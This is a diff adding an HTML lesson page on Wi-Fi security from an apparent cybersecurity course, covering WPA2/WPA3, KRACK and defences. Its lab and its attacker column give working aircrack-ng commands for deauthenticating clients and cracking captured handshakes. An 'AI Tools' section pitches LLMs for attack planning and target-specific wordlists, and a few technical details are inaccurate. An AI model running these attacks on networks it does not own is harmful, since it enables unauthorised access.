@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 33 — Wireless Security Basics</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:900px;margin:0 auto;padding:40px 22px 100px;}
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+  .pbar{width:120px;height:5px;background:var(--edge);border-radius:3px;overflow:hidden;}
+  .pbar i{display:block;width:36.6%;height:100%;background:var(--green);}
+  .day-tag{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:13px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:5px 12px;border-radius:20px;margin-bottom:18px;}
+  .day-tag::before{content:'●';font-size:9px;}
+  h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(26px,4.5vw,38px);line-height:1.2;margin-bottom:10px;}
+  h1 .accent{color:var(--green);}
+  .subtitle{color:var(--muted);font-size:15px;margin-bottom:30px;max-width:660px;}
+  section{margin-bottom:34px;}
+  .tag-pill{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;padding:6px 14px;border-radius:20px;margin-bottom:16px;}
+  .tag-pill.theory{background:rgba(79,209,255,0.1);color:var(--cyan);border:1px solid rgba(79,209,255,0.35);}
+  .tag-pill.lab{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  .tag-pill.interview{background:rgba(179,137,255,0.1);color:var(--purple);border:1px solid rgba(179,137,255,0.35);}
+  .tag-pill.biz{background:rgba(255,180,84,0.1);color:var(--amber);border:1px solid rgba(255,180,84,0.35);}
+  .tag-pill.teach{background:rgba(255,92,92,0.1);color:var(--red);border:1px solid rgba(255,92,92,0.35);}
+  .tag-pill.ai{background:rgba(255,107,214,0.1);color:var(--pink);border:1px solid rgba(255,107,214,0.35);}
+  .tag-pill.job{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  p{font-size:14.5px;color:#cdd6da;margin-bottom:12px;}
+  strong{color:var(--text);}
+  code{background:#070a0b;border:1px solid var(--edge);border-radius:4px;padding:2px 6px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);}
+  .card{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:22px 24px;}
+  .callout{background:rgba(79,209,255,0.05);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0;font-size:13.5px;color:#c5d5da;}
+  .callout.amber{background:rgba(255,180,84,0.05);border-color:var(--amber);}
+  .callout.red{background:rgba(255,92,92,0.05);border-color:var(--red);}
+  .callout.green{background:rgba(57,255,136,0.05);border-color:var(--green);}
+  .callout strong{color:var(--cyan);}
+  .callout.amber strong{color:var(--amber);}
+  .mindset-grid{display:flex;gap:14px;margin-top:14px;flex-wrap:wrap;}
+  .mindset-col{flex:1;min-width:230px;border-radius:10px;padding:16px 18px;}
+  .mindset-col.attacker{background:rgba(255,92,92,0.05);border:1px solid rgba(255,92,92,0.2);}
+  .mindset-col.defender{background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.2);}
+  .mindset-col .role{font-family:'IBM Plex Mono',monospace;font-size:11px;text-transform:uppercase;margin-bottom:10px;font-weight:700;}
+  .mindset-col.attacker .role{color:var(--red);}
+  .mindset-col.defender .role{color:var(--green);}
+  .mindset-col ul{padding-left:16px;font-size:13px;color:#cdd6da;}
+  .mindset-col li{margin-bottom:6px;}
+
+  .wifi-diagram{background:var(--bg);border:1px solid var(--edge);border-radius:10px;padding:18px 20px;font-family:'IBM Plex Mono',monospace;font-size:11.5px;line-height:1.8;margin:10px 0;overflow-x:auto;}
+  .wifi-diagram .arrow{color:var(--green);}
+  .wifi-diagram .label{color:var(--muted);}
+  .wifi-diagram .hl{color:var(--cyan);}
+  .wifi-diagram .danger{color:var(--red);}
+  .wifi-diagram .key{color:var(--amber);}
+
+  .code-block{background:#070a0b;border:1px solid var(--edge);border-radius:8px;padding:14px 16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;overflow-x:auto;line-height:1.7;margin:10px 0;}
+  .code-block .req{color:var(--green);}
+  .code-block .hdr{color:var(--cyan);}
+  .code-block .val{color:var(--amber);}
+  .code-block .body{color:#8fa5ad;}
+  .code-block .cmt{color:var(--muted);}
+  .code-block .danger{color:var(--red);}
+
+  .terminal{background:#070a0b;border:1px solid var(--edge);border-radius:10px;padding:0;margin-top:12px;overflow:hidden;}
+  .term-chrome{display:flex;align-items:center;gap:8px;padding:9px 14px;background:#0e1517;border-bottom:1px solid var(--edge);}
+  .term-body{padding:16px 18px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);overflow-x:auto;white-space:pre-wrap;line-height:1.75;}
+  .term-body .c{color:var(--muted);}
+  .term-body .out{color:#8fa5ad;}
+  .term-body .cmd{color:var(--cyan);}
+  .term-body .hi{color:var(--amber);}
+  .term-body .danger{color:var(--red);}
+
+  .lab-steps{list-style:none;counter-reset:step;margin-top:12px;}
+  .lab-steps li{counter-increment:step;position:relative;padding-left:38px;margin-bottom:12px;font-size:14px;color:#cdd6da;}
+  .lab-steps li::before{content:counter(step);position:absolute;left:0;top:0;width:24px;height:24px;border-radius:50%;background:var(--panel);border:1px solid var(--green);color:var(--green);font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+  .deliverable{margin-top:10px;background:rgba(255,180,84,0.06);border:1px solid rgba(255,180,84,0.25);border-radius:8px;padding:11px 15px;font-size:13px;color:var(--amber);}
+
+  .interview-box{border-left:3px solid var(--purple);padding-left:16px;margin-top:12px;}
+  .interview-box .q{font-weight:600;font-size:14px;margin-bottom:7px;color:var(--text);}
+  .interview-box .a{font-size:13.5px;color:#b8c2c6;line-height:1.6;}
+  .interview-box + .interview-box{margin-top:20px;}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px;margin-top:12px;}
+  .ai-card{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:10px;padding:14px;}
+  .ai-card .aname{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:12.5px;color:var(--pink);margin-bottom:5px;}
+  .ai-card .adesc{font-size:12px;color:var(--muted);}
+
+  .job-card{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:12px;padding:18px 20px;}
+  .job-card .label{font-family:'IBM Plex Mono',monospace;color:var(--green);font-size:11px;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:10px;}
+  .job-card ul{padding-left:16px;font-size:13.5px;color:#cdd6da;}
+  .job-card li{margin-bottom:8px;}
+
+  .biz-card{background:linear-gradient(135deg,rgba(255,180,84,0.06),rgba(57,255,136,0.04));border:1px solid rgba(255,180,84,0.2);border-radius:12px;padding:18px 20px;}
+  .teach-card{background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.15);border-radius:12px;padding:18px 20px;}
+
+  .res-grid{display:grid;gap:10px;margin-top:10px;}
+  .res-card{display:flex;gap:12px;align-items:flex-start;background:var(--panel);border:1px solid var(--edge);border-radius:10px;padding:14px 16px;text-decoration:none;color:var(--text);transition:border-color .2s;}
+  .res-card:hover{border-color:var(--cyan);}
+  .res-icon{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--bg);border-radius:5px;padding:3px 8px;flex-shrink:0;margin-top:2px;font-weight:700;}
+  .res-icon.en{background:var(--red);}
+  .res-icon.hi{background:var(--amber);}
+  .res-icon.lab{background:var(--green);}
+  .res-title{font-weight:600;font-size:13.5px;}
+  .res-desc{font-size:12px;color:var(--muted);margin-top:2px;}
+
+  .mistakes-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin-top:12px;}
+  .mistake-item{display:flex;align-items:flex-start;gap:8px;background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;font-size:12.5px;color:#b8c2c6;}
+  .mistake-item .check{color:var(--green);font-weight:700;flex-shrink:0;}
+
+  .checklist{list-style:none;}
+  .checklist li{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--edge);font-size:14px;color:#cdd6da;}
+  .checklist li:last-child{border-bottom:none;}
+  .checklist .box{width:17px;height:17px;border:1.5px solid var(--green);border-radius:4px;flex-shrink:0;margin-top:2px;}
+
+  .stamp-wrap{display:flex;justify-content:center;margin:44px 0 28px;}
+  .stamp{border:3px solid var(--green);border-radius:50%;width:155px;height:155px;display:flex;flex-direction:column;align-items:center;justify-content:center;transform:rotate(-8deg);color:var(--green);font-family:'IBM Plex Mono',monospace;text-transform:uppercase;box-shadow:0 0 28px rgba(57,255,136,0.12);}
+  .stamp .l1{font-size:10px;letter-spacing:0.1em;}
+  .stamp .l2{font-size:22px;font-weight:700;margin:4px 0;}
+  .stamp .l3{font-size:10px;letter-spacing:0.1em;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap/day33$ cat wireless-security.md</span>
+    <div style="display:flex;align-items:center;gap:6px;">Day 33/90 — Phase 2 <div class="pbar"><i></i></div></div>
+  </div>
+
+  <div class="day-tag">DAY 33 OF 90 — PHASE 2: CORE SECURITY CONCEPTS</div>
+  <h1>Wireless Security <span class="accent">Basics</span></h1>
+  <p class="subtitle">Wi-Fi signals don't stop at walls. Today you understand WPA2/WPA3 authentication, capture handshakes, and learn how open networks leak everything.</p>
+
+  <!-- THEORY -->
+  <section>
+    <span class="tag-pill theory">THEORY</span>
+    <div class="card">
+      <p><strong>Wireless authentication — WPA2 vs WPA3:</strong> WPA2 (Wi-Fi Protected Access 2) uses the 4-way handshake for authentication. The client proves knowledge of the Pre-Shared Key (PSK) without revealing it directly. The handshake produces a Pairwise Transient Key (PTK) used for encrypting all subsequent traffic with AES-CCMP. WPA3 (2018) replaces the 4-way handshake with Simultaneous Authentication of Equals (SAE), which provides forward secrecy and is resistant to offline dictionary attacks that plague WPA2.</p>
+
+      <p style="margin-top:16px;"><strong>The WPA2 4-Way Handshake:</strong></p>
+      <div class="wifi-diagram">
+<span class="label">AP (Access Point)                              Client</span>
+<span class="label">  |                                              |</span>
+<span class="arrow">  |  ←——— EAPOL-Key (Anonce) ———————  |  (1) AP sends its random number</span>
+<span class="label">  |                                              |</span>
+<span class="arrow">  |  ———→ EAPOL-Key (Snonce + MIC) ———→  |  (2) Client sends its random + MIC</span>
+<span class="label">  |                                              |</span>
+<span class="arrow">  |  ←——— EAPOL-Key (MIC + GTK) ——————  |  (3) AP sends MIC + Group Temporal Key</span>
+<span class="label">  |                                              |</span>
+<span class="arrow">  |  ———→ EAPOL-Key (ACK) ———————————→  |  (4) Client acknowledges</span>
+<span class="label">  |                                              |</span>
+<span class="label">                     ↑ If you capture these 4 packets,</span>
+<span class="label">                       you can crack the PSK offline.</span></div>
+
+      <p style="margin-top:16px;"><strong>WPA2 PSK cracking — the math:</strong></p>
+      <div class="code-block">
+<span class="cmt"># PSK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096, 256)</span>
+<span class="cmt"># PTK = PRF-X(PMK, "Pairwise key expansion", Min(AP_MAC,Client_MAC) ||</span>
+<span class="cmt">#             Max(AP_MAC,Client_MAC) || Min(Anonce,Snonce) || Max(Anonce,Snonce))</span>
+<span class="cmt"># The MIC in message 3 is a hash of the PTK. When you guess the passphrase,</span>
+<span class="cmt"># you derive the PTK and check if the MIC matches. If yes → correct password.</span>
+
+<span class="cmt"># aircrack-ng automates this entire derivation & verification:</span>
+<span class="req">aircrack-ng -w rockyou.txt -b AP_MAC handshake.cap</span></div>
+
+      <div class="callout"><strong>WPA3 fixes the offline dictionary attack:</strong> WPA2's PSK can be cracked offline if you capture the 4-way handshake. WPA3's SAE (Simultaneous Authentication of Equals) uses a Password Authenticated Key Exchange (PAKE) called Dragonfly. An attacker who captures a WPA3 handshake cannot perform offline brute force because each guess requires interacting with the real access point — the attack becomes online, which is slow, noisy, and detectable.</div>
+    </div>
+  </section>
+
+  <!-- MINDSET -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// attacker vs defender mindset</div>
+    <div class="mindset-grid">
+      <div class="mindset-col attacker">
+        <div class="role">⚔ Attacker</div>
+        <ul>
+          <li>Enable monitor mode on your wireless adapter: <code>airmon-ng start wlan0</code>. List nearby APs: <code>airodump-ng wlan0mon</code>.</li>
+          <li>Capture the 4-way handshake: <code>airodump-ng -c CHANNEL --bssid AP_MAC -w capture wlan0mon</code>. If no client is connecting, deauthenticate one: <code>aireplay-ng -0 2 -a AP_MAC -c CLIENT_MAC wlan0mon</code>.</li>
+          <li>Crack the handshake offline: <code>aircrack-ng -w wordlist.txt -b AP_MAC capture-01.cap</code>. Use rockyou.txt or generate targeted wordlists.</li>
+          <li>Set up a rogue Evil Twin AP with a similar SSID — if clients auto-connect, you can capture their handshake without knowing the password (PMKID attack).</li>
+        </ul>
+      </div>
+      <div class="mindset-col defender">
+        <div class="role">🛡 Defender</div>
+        <ul>
+          <li>Use WPA3 if all devices support it — SAE prevents offline dictionary attacks against captured handshakes.</li>
+          <li>Use a strong, random WPA2 passphrase — 16+ characters with mixed case, numbers, and symbols. Avoid dictionary words, names, and common phrases.</li>
+          <li>Disable WPS (Wi-Fi Protected Setup) — the WPS PIN brute force attack (Pixie Dust) can recover the PSK in seconds regardless of passphrase strength.</li>
+          <li>Implement 802.1X / RADIUS (WPA2-Enterprise) with individual credentials instead of a shared PSK. EAP-TLS with client certificates is the gold standard.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- REAL INCIDENT -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// real named incident</div>
+    <div class="breach-card" style="background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.2);border-radius:12px;padding:18px 20px;">
+      <div class="year" style="font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);margin-bottom:5px;">2017 — KRACK WPA2 ATTACK — CVE-2017-13077 THROUGH 13088</div>
+      <div class="name" style="font-weight:700;font-size:15px;margin-bottom:7px;">Protocol-level vulnerability in WPA2 allowed decryption of encrypted Wi-Fi traffic</div>
+      <div class="detail" style="font-size:13px;color:#b8c2c6;line-height:1.6;">Researcher Mathy Vanhoef discovered a fundamental weakness in the WPA2 protocol itself — not a brute force or passphrase crack, but a cryptographic protocol vulnerability. The KRACK (Key Reinstallation Attack) exploited the 4-way handshake's third message: an attacker could force the victim to reinstall an already-in-use encryption key by replaying the message. Each reinstallation reset the nonce and the replay counter used by AES-CCMP, allowing the attacker to decrypt packets, forge packets, and in some cases inject ransomware into HTTP connections. The attack worked against WPA2 with any passphrase strength — even a perfectly strong password was useless. The fix required patching all Wi-Fi client devices (phones, laptops, IoT), and the slow patch rollout left billions of devices vulnerable for years.</div>
+    </div>
+  </section>
+
+  <!-- LAB -->
+  <section>
+    <span class="tag-pill lab">HANDS-ON LAB</span>
+    <div class="card">
+      <p><strong>Goal:</strong> capture a WPA2 4-way handshake, crack the PSK offline, and analyze wireless security settings.</p>
+      <ol class="lab-steps">
+        <li>Enable monitor mode: <code>sudo airmon-ng start wlan0</code>. Verify with <code>iwconfig</code> — the interface should show "Mode:Monitor".</li>
+        <li>Scan for nearby networks: <code>sudo airodump-ng wlan0mon</code>. Note the BSSID, channel, encryption type (WPA2 vs WPA3), and signal strength.</li>
+        <li>Capture traffic on a specific AP: <code>sudo airodump-ng -c CHANNEL --bssid AP_BSSID -w handshake wlan0mon</code>.</li>
+        <li>Force a client to reconnect (deauth attack): <code>sudo aireplay-ng -0 2 -a AP_BSSID -c CLIENT_BSSID wlan0mon</code>. Wait for the handshake in airodump-ng output.</li>
+        <li>Verify the handshake was captured: <code>aircrack-ng handshake-01.cap</code> — it will confirm the number of handshakes found.</li>
+        <li>Crack the PSK offline: <code>sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AP_BSSID handshake-01.cap</code>. Use a known password for testing.</li>
+      </ol>
+      <div class="deliverable"><strong>Deliverable:</strong> A captured WPA2 4-way handshake file (.cap) and a screenshot of aircrack-ng successfully cracking the PSK (against your own AP only).</div>
+    </div>
+
+    <div class="terminal">
+      <div class="term-chrome"><div class="term-dot" style="background:#ff5f56;"></div><div class="term-dot" style="background:#ffbd2e;"></div><div class="term-dot" style="background:#27c93f;"></div></div>
+      <div class="term-body"><span class="c"># Step 1 — Enable monitor mode on your Wi-Fi adapter</span>
+<span class="cmd">sudo airmon-ng start wlan0</span>
+<span class="out">PHY  Interface  Driver      Chipset</span>
+<span class="out">phy0 wlan0      iwlwifi     Intel Corporation</span>
+<span class="out">     wlan0mon   iwlwifi     (monitor mode enabled)</span>
+
+<span class="c"># Step 2 — Scan for nearby APs</span>
+<span class="cmd">sudo airodump-ng wlan0mon</span>
+<span class="out">BSSID              CH  ENC   ESSID</span>
+<span class="out">AA:BB:CC:DD:EE:FF  6   WPA2  MyHomeWiFi</span>
+
+<span class="c"># Step 3 — Capture traffic on specific AP</span>
+<span class="cmd">sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \</span>
+<span class="cmd">  -w handshake wlan0mon</span>
+
+<span class="c"># Step 4 — Deauthenticate a connected client (forces reconnect)</span>
+<span class="cmd">sudo aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF \</span>
+<span class="cmd">  -c 11:22:33:44:55:66 wlan0mon</span>
+<span class="hi"># Watch airodump for "[WPA handshake: AA:BB:CC:DD:EE:FF]"</span>
+
+<span class="c"># Step 5 — Verify the captured handshake</span>
+<span class="cmd">aircrack-ng handshake-01.cap</span>
+<span class="out">Found 1 WPA handshake: AA:BB:CC:DD:EE:FF</span>
+
+<span class="c"># Step 6 — Crack the PSK (against YOUR OWN AP only)</span>
+<span class="cmd">sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \</span>
+<span class="cmd">  -b AA:BB:CC:DD:EE:FF handshake-01.cap</span>
+<span class="hi"># If the password is in the wordlist, aircrack-ng displays it.</span></div>
+    </div>
+  </section>
+
+  <!-- INTERVIEW -->
+  <section>
+    <span class="tag-pill interview">INTERVIEW READY</span>
+    <div class="card">
+      <div class="interview-box">
+        <div class="q">Q: "How does WPA2's 4-way handshake work and what's its weakness?"</div>
+        <div class="a">A: "The 4-way handshake authenticates a client to an AP by proving knowledge of the PSK without transmitting it. The AP sends an Anonce, the client responds with a Snonce and a MIC (Message Integrity Code). The AP sends its MIC and the GTK. The client acknowledges. Both sides derive the same PTK from the PSK and nonces. The weakness: if an attacker captures all four messages, they can perform an offline dictionary attack to recover the PSK by trying candidate passwords and checking if the derived MIC matches."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "What is the KRACK attack and why was it significant?"</div>
+        <div class="a">A: "KRACK (Key Reinstallation Attack) exploited the third message of the WPA2 4-way handshake. An attacker within Wi-Fi range could replay the third message, causing the victim to reinstall an already-in-use encryption key. This reset the nonce and replay counter, allowing packet decryption and injection. Importantly, KRACK didn't require knowing the Wi-Fi password — it exploited a protocol flaw, not a weak password. Every WPA2-secured network was vulnerable. The fix required client-side patches to track whether keys had already been installed."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "What are the security differences between WPA2-PSK and WPA2-Enterprise?"</div>
+        <div class="a">A: "WPA2-PSK uses a single shared passphrase for all users — if the passphrase is compromised, every device on the network is vulnerable. WPA2-Enterprise uses 802.1X authentication with a RADIUS server, giving each user unique credentials. Enterprise also supports EAP-TLS with client certificates, which provides mutual authentication and prevents rogue AP attacks. The trade-off is complexity: Enterprise requires a RADIUS server and per-device configuration, while PSK just needs a password."</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- AI TOOLS -->
+  <section>
+    <span class="tag-pill ai">AI TOOLS</span>
+    <div class="ai-grid">
+      <div class="ai-card">
+        <div class="aname">Wireless pentest planner</div>
+        <div class="adesc">Describe the target environment (AP model, encryption type, client count) — an LLM can suggest the optimal attack strategy: capture handshake, PMKID attack, or WPS brute force.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">WPA key derivation explainer</div>
+        <div class="adesc">Ask an LLM to walk through the PBKDF2 and PRF-X key derivation functions with example values — helps understand what aircrack-ng is doing under the hood.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Wi-Fi site survey generator</div>
+        <div class="adesc">Describe a physical space (floor plan, walls, devices) — an LLM can recommend AP placement, channel selection, and signal optimization for security and coverage.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Wordlist generator for WPA cracking</div>
+        <div class="adesc">Provide context about the target (company name, location, nearby businesses, years) — an LLM can generate a targeted wordlist for handshake cracking beyond rockyou.txt.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- JOB -->
+  <section>
+    <span class="tag-pill job">HOW THIS GETS YOU PLACED</span>
+    <div class="job-card">
+      <div class="label">// placement & resume angles</div>
+      <ul>
+        <li><strong>Resume bullet:</strong> "Captured WPA2 4-way handshake using airodump-ng; performed offline PSK cracking with aircrack-ng; compared WPA2, WPA3, and WPA2-Enterprise security models in a lab environment."</li>
+        <li><strong>Portfolio piece:</strong> Screenshots of airodump-ng handshake capture and aircrack-ng successfully cracking a test password. Also include a WPA2 vs WPA3 comparison table.</li>
+        <li><strong>Interview talking point:</strong> explaining KRACK (a protocol-level vulnerability that bypasses passphrase strength) vs dictionary-based handshake cracking (which depends on passphrase strength) shows you understand Wi-Fi security at depth — a rare skill for entry-level candidates.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- BIZ -->
+  <section>
+    <span class="tag-pill biz">ENTREPRENEUR ANGLE</span>
+    <div class="biz-card">
+      <p>Wireless security assessments are a standard component of physical penetration testing and red teaming. Every office, warehouse, and retail location has Wi-Fi — and most are configured with minimal security. A single weak WPA2 passphrase or an enabled WPS PIN can compromise an entire corporate network.</p>
+      <p style="margin-bottom:0;">Productized opportunity: "Wi-Fi Security Audit" — a $1,000-2,500 service where you physically visit a client's office, perform a wireless site survey (rogue AP detection, signal leakage analysis), test WPA2 passphrase strength, check for WPS vulnerabilities, and evaluate WPA2-Enterprise RADIUS configuration. Deliver a report with a "war driving" map showing signal leakage beyond the building perimeter, passphrase strength assessment, and remediation recommendations. Every law firm, healthcare provider, and financial services office should have this done annually.</p>
+    </div>
+  </section>
+
+  <!-- TEACH IT BACK -->
+  <section>
+    <span class="tag-pill teach">TEACH IT BACK</span>
+    <div class="teach-card">
+      <p style="margin-bottom:0;">Explain out loud, in under 90 seconds, without notes: "How does WPA2 authenticate users, what is the 4-way handshake, and why does KRACK break it?" If you can draw the four EAPOL messages and explain what key material is exchanged in each, you've actually learned today's material.</p>
+    </div>
+  </section>
+
+  <!-- VIDEOS -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// watch</div>
+    <div class="res-grid">
+      <a class="res-card" href="https://www.youtube.com/watch?v=Oh4WURZoR1M" target="_blank">
+        <span class="res-icon en">EN</span>
+        <div><div class="res-title">KRACK Attack Explained — Computerphile</div><div class="res-desc">youtube.com/watch?v=Oh4WURZoR1M — Dr. Mike Pound explains the WPA2 key reinstallation vulnerability with clear visuals and protocol diagrams.</div></div>
+      </a>
+      <a class="res-card" href="https://www.youtube.com/watch?v=_5JzUQCD-J4" target="_blank">
+        <span class="res-icon hi">HI</span>
+        <div><div class="res-title">Wi-Fi Security and WPA2 Cracking in Hindi — Hacker Bhai</div><div class="res-desc">youtube.com/watch?v=_5JzUQCD-J4 — Hindi tutorial on WPA2 handshake capture and offline PSK cracking with aircrack-ng.</div></div>
+      </a>
+      <a class="res-card" href="https://tryhackme.com/room/wifihacking101" target="_blank">
+        <span class="res-icon lab">LAB</span>
+        <div><div class="res-title">TryHackMe — Wi-Fi Hacking 101</div><div class="res-desc">tryhackme.com/room/wifihacking101 — Free room covering monitor mode, handshake capture, deauth attacks, and WPA cracking.</div></div>
+      </a>
+      <a class="res-card" href="https://www.krackattacks.com/" target="_blank">
+        <span class="res-icon lab">LAB</span>
+        <div><div class="res-title">KRACK Attack Official Website</div><div class="res-desc">krackattacks.com — Full technical paper, attack demonstrations, detection tools, and patching guidance from the original researcher.</div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- MISTAKES -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// mistakes avoided today</div>
+    <div class="mistakes-grid">
+      <div class="mistake-item"><span class="check">✓</span> WPA2 4-way handshake explained with message-by-message diagram.</div>
+      <div class="mistake-item"><span class="check">✓</span> Real KRACK incident — protocol flaw, not weak password.</div>
+      <div class="mistake-item"><span class="check">✓</span> PSK → PTK key derivation math explained (PBKDF2 + PRF-X).</div>
+      <div class="mistake-item"><span class="check">✓</span> WPA3 SAE taught as the fix for offline dictionary attacks.</div>
+      <div class="mistake-item"><span class="check">✓</span> aircrack-ng workflow from monitor mode through cracked PSK.</div>
+      <div class="mistake-item"><span class="check">✓</span> WPA2-PSK vs WPA2-Enterprise vs WPA3 compared.</div>
+      <div class="mistake-item"><span class="check">✓</span> WPS Pixie Dust attack mentioned — a practical bypass to mention in interviews.</div>
+    </div>
+  </section>
+
+  <!-- CHECKLIST -->
+  <section>
+    <div class="card">
+      <ul class="checklist">
+        <li><span class="box"></span> I can explain the WPA2 4-way handshake.</li>
+        <li><span class="box"></span> I captured a 4-way handshake with airodump-ng.</li>
+        <li><span class="box"></span> I cracked a WPA2 PSK with aircrack-ng.</li>
+        <li><span class="box"></span> I understand the KRACK attack and why it's dangerous.</li>
+        <li><span class="box"></span> I can compare WPA2, WPA3, and WPA2-Enterprise.</li>
+        <li><span class="box"></span> I understand why WPA3 SAE prevents offline cracking.</li>
+        <li><span class="box"></span> I can teach wireless security out loud in 90 seconds.</li>
+      </ul>
+    </div>
+  </section>
+
+  <div class="stamp-wrap">
+    <div class="stamp"><div class="l1">Day Complete</div><div class="l2">33 / 90</div><div class="l3">Verified ✓</div></div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">tomorrow — day 34</div>
+      <div class="title">Phase 3 begins — Active Directory & Network Services.</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>say "Day 34" when ready — one concept, one hour, one day at a time.</footer>
+
+</div>
+</body>
+</html>
